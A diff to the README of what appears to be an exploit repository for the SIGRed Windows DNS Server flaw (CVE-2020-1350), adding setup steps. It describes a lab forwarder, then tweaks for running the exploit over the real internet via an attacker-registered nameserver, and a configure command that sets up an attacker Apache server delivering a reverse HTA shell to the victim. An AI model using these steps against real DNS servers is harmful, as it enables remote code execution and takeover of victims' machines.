@@ -10,20 +10,42 @@ Details on the methods used are here:
 
 https://www.graplsecurity.com/post/anatomy-of-an-exploit-rce-with-cve-2020-1350-sigred
 
-## Lab Environment Setup
+## Environment Setup
 
-An attacker would set up an evil domain whose NS record points to a malicious server (attacker machine). 
+### Lab Environment: Setting a Forwarder
+
 For demo/testing purposes, just set up a conditional forwarder on the victim machine to forward "evil domain" requests to your attacker machine.
 
 Tools -> DNS
 ![Alt text](images/forward.png?raw=true "Set up a forwarder")
 ![Alt text](images/ch0mpie.png?raw=true "Forwarding for ch0mpie.com")
 
+This is so you can listen on port 53 and still have a DNS server configured.
+
+### Registering a custom Nameserver
+
+If you are NOT setting a forwarder, i.e. actually registering your attacker machine as a custom name server for your domain and running this over real internet...
+***Note: I really don't recommend this and take no responsibility if you do something stupid.***
+
+***This exploit is configured assuming your nameserver is registered as ns1.[yourevildomain]*** 
+
+You need to do the following tweaks to make this work over real internet:
+
+Comment out the line: `os.system('systemctl stop systemd-resolved')` in `evildns.py` 
+
+Follow these instructions to fix your DNS configuration: https://www.linuxuprising.com/2020/07/ubuntu-how-to-free-up-port-53-used-by.html
+
+This is so you can listen on port 53 and still have a DNS server configured.
+
+
+## Configuring Attacker Machine
+
 On the Linux attacker machine: (I used a base Ubuntu 20.04.1 VM)
 
 `sudo python3 configure.py -ip IP_ATTACKER -p PORT_REVERSE_SHELL -hp PORT_APACHE_SERVER (default 80)`
 
 This configures the Apache server that the victim will download the reverse HTA shell.
+
 
 ## Running the Exploit
 
